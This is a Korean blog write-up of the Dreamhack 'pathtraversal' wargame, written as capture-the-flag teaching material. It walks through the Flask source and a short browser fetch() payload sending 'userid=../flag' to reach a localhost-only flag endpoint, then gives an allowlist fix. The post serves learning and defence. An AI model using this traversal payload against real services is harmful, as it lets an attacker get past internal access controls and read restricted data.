---
title: Dreamhack pathtraversal 풀이
description: 사용자 입력으로 내부 API 요청 경로를 조작해 localhost 접근 제한을 우회하는 문제.
category: Dreamhack Web
tags:
  - WebHacking
  - Web
  - Wargame
  - Dreamhack
createdAt: 2026-11-04
updatedAt: 2026-11-05
draft: false
---
## 문제

![Dreamhack pathtraversal 문제 안내](/images/image-1.png)

문제 링크: [Dreamhack pathtraversal](https://dreamhack.io/wargame/challenges/12)



## Path Traversal 취약점이란?

<strong>Path Traversal(경로 탐색 취약점)</strong>은 `../`와 같은 경로 이동 문자열을 이용하여 정상적으로 접근할 수 없는 파일이나 디렉터리, URL 경로에 접근하는 취약점이다.

사용자 입력값에 대한 검증이 제대로 이루어지지 않을 때 발생하며, 이를 악용하면 서버 내부의 민감한 정보를 열람하거나 접근이 제한된 경로에 접근할 수 있다.

이 문제에서는 파일 경로 대신 서버가 요청하는 내부 API의 URL 경로를 조작한다. 사용자 정보 조회용 경로에서 벗어나 플래그를 반환하는 API에 접근하는 것이 목표다.



## 소스 코드

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, abort
from functools import wraps
import requests
import os, json

users = {
    '0': {
        'userid': 'guest',
        'level': 1,
        'password': 'guest'
    },
    '1': {
        'userid': 'admin',
        'level': 9999,
        'password': 'admin'
    }
}

def internal_api(func):
    @wraps(func)
    def decorated_view(*args, **kwargs):
        if request.remote_addr == '127.0.0.1':
            return func(*args, **kwargs)
        else:
            abort(401)
    return decorated_view

app = Flask(__name__)
app.secret_key = os.urandom(32)
API_HOST = 'http://127.0.0.1:8000'

try:
    FLAG = open('./flag.txt', 'r').read() # Flag is here!!
except:
    FLAG = '[**FLAG**]'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    if request.method == 'GET':
        return render_template('get_info.html')
    elif request.method == 'POST':
        userid = request.form.get('userid', '')
        info = requests.get(f'{API_HOST}/api/user/{userid}').text
        return render_template('get_info.html', info=info)

@app.route('/api')
@internal_api
def api():
    return '/user/<uid>, /flag'

@app.route('/api/user/<uid>')
@internal_api
def get_flag(uid):
    try:
        info = users[uid]
    except:
        info = {}
    return json.dumps(info)

@app.route('/api/flag')
@internal_api
def flag():
    return FLAG

application = app # app.run(host='0.0.0.0', port=8000)
# Dockerfile
#     ENTRYPOINT ["uwsgi", "--socket", "0.0.0.0:8000", "--protocol=http", "--threads", "4", "--wsgi-file", "app.py"]
```



## 풀이 시도

![userid 입력 폼과 View 버튼](/images/image-2.png)

일단 `/get_info`에 들어가면 userid를 입력하는 화면이 나온다. `guest`를 입력하고 `View`를 누르면 다음과 같이 사용자 정보가 출력된다.



![guest 사용자 정보 조회 결과](/images/image-3.png)

화면에는 `guest`를 입력했지만, 내부 API에서 사용하는 사용자 키는 문자열 `'0'`이다. 이름을 키로 바꾸는 처리는 위 Python 코드가 아니라 폼의 JavaScript에서 이루어진다. 앞서 같은 문제를 정리한 [풀이](/lab/posts/dreamhack-index-path-traversal/)에도 다음 코드가 기록되어 있다.

```javascript
const users = {
    'guest': 0,
    'admin': 1
};

function user(evt) {
    document.getElementById('userid').value =
        users[document.getElementById('userid').value];
    return true;
}

window.onload = function () {
    document.getElementById('form').addEventListener('submit', user);
};
```

즉, 일반 폼으로 제출하면 `guest → 0`, `admin → 1`로 변환된 값이 서버에 전달된다. 서버는 이 값을 내부 API 경로에 넣고, API는 `users[uid]`를 조회한 뒤 `json.dumps(info)`로 JSON 문자열을 반환한다.

같은 방식으로 `admin`을 입력하면 다음 정보가 출력된다.



![admin 사용자 정보 조회 결과](/images/image-4.png)

이는 아래 `users` 딕셔너리의 `'1'` 항목에 해당한다.



```python
users = {
    '0': {
        'userid': 'guest',
        'level': 1,
        'password': 'guest'
    },
    '1': {
        'userid': 'admin',
        'level': 9999,
        'password': 'admin'
    }
}
```

정상 조회 동작을 확인했으니, 이제 내부 API 요청이 만들어지는 부분을 살펴보자. 이름을 숫자로 바꾸는 코드는 브라우저에서만 실행되므로, 폼을 거치지 않고 직접 POST 요청을 보내면 원하는 `userid` 값을 전달할 수 있다.



소스코드에서 **pathtraversal** 취약점이 발생할 수 있는 부분은 다음과 같다.

```python
@app.route('/get_info', methods=['GET', 'POST'])
def get_info():
    if request.method == 'GET':
        return render_template('get_info.html')
    elif request.method == 'POST':
        userid = request.form.get('userid', '')
        info = requests.get(f'{API_HOST}/api/user/{userid}').text
        return render_template('get_info.html', info=info)
```

`get_info()` 함수에서는 사용자가 POST 요청으로 전달한 `userid` 값을 받아 사용자 정보를 조회하는데, 이때 입력받은 `userid` 값을 별도의 검증 없이 `requests.get()`의 URL 경로에 삽입하고 있어 Path Traversal 취약점이 발생한다.

따라서 POST 요청의 `userid`에 `../flag`를 직접 전달하면 `http://127.0.0.1:8000/api/user/../flag`라는 URL이 만들어진다. 이 URL은 HTTP 클라이언트의 요청 준비 과정에서 경로가 정규화되어 `http://127.0.0.1:8000/api/flag`가 된다.

여기서 중요한 것은 `/api/flag`에 붙어 있는 `@internal_api`다. 이 데코레이터는 `request.remote_addr == '127.0.0.1'`일 때만 접근을 허용한다. 외부에서 직접 요청하면 이 조건을 통과할 수 없지만, `/get_info`가 서버 내부에서 `requests.get()`으로 요청하면 localhost에서 시작한 요청이므로 조건을 통과한다.

```text
브라우저: POST /get_info, userid=../flag
  → 서버가 http://127.0.0.1:8000/api/user/../flag 구성
  → 요청 준비 과정에서 /api/flag로 경로 정규화
  → 서버 내부에서 /api/flag 요청
  → internal_api의 출발지 검사 통과
  → FLAG가 /get_info 응답에 포함되어 브라우저로 반환
```

경로 정규화 자체는 실제 요청을 보내지 않고도 아래처럼 확인할 수 있다.

```python
from requests import Request

request = Request('GET', 'http://127.0.0.1:8000/api/user/../flag')
print(request.prepare().url)
# http://127.0.0.1:8000/api/flag
```

이 동작은 로컬 Requests 환경에서 확인한 것이며, 문제 서버와 동일한 라이브러리 버전을 재현한 검증은 아니다. 요청 준비 단계는 [Requests 공식 문서](https://requests.readthedocs.io/en/latest/user/advanced/#prepared-requests)에서도 확인할 수 있다.



## 익스플로잇 코드

문제 인스턴스 페이지에서 개발자 도구의 Console을 열고 다음 코드를 실행한다. `/get_info`는 상대 경로이므로 해당 문제 사이트에서 실행해야 한다.

```javascript
fetch('/get_info', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'userid=../flag'
})
.then(response => response.text())
.then(html => {
    document.open();
    document.write(html);
    document.close();
});
```

`fetch()` 함수를 이용해 `/get_info` 경로로 POST 요청을 보내고, `body`에 `userid=../flag`를 전달하였다.

이 요청은 일반 폼의 submit 이벤트를 거치지 않으므로 JavaScript의 사용자 이름 변환도 실행되지 않는다. 따라서 `../flag`가 그대로 서버에 전달되어 앞서 설명한 내부 API 요청을 유도한다.

마지막 `.then()`에서는 응답 HTML을 현재 문서에 표시한다. `document.open()`, `document.write()`, `document.close()`는 결과를 화면에 보여 주기 위한 부분이며, 취약점을 이용하는 핵심은 POST 요청으로 전달한 `userid=../flag`다.



## 결과

![image.png](/images/image-6.png)

![image.png](/images/image-5.png)

이렇게 플래그를 얻을 수 있다.

## 수정 방안

이 코드에서는 유효한 사용자 키가 `'0'`, `'1'`로 정해져 있다. 내부 API URL을 만들기 전에 서버에서 허용된 키인지 검사하면 `../flag`와 같은 값을 거부할 수 있다.

```python
# /get_info의 POST 처리 부분 수정 예시
userid = request.form.get('userid', '')
if userid not in users:
    abort(400)

info = requests.get(f'{API_HOST}/api/user/{userid}', timeout=3).text
return render_template('get_info.html', info=info)
```

여기서 경로 조작을 막는 부분은 `userid not in users` 검사다. `timeout`은 내부 API 응답을 무한정 기다리지 않도록 별도로 설정한 것이다.

브라우저의 이름 변환이나 입력 검증만으로는 직접 만든 POST 요청을 막을 수 없다. 또한 내부 전용 API도 호출자의 IP만 믿기보다 인증과 작업별 권한 검사를 함께 적용하는 편이 좋다.

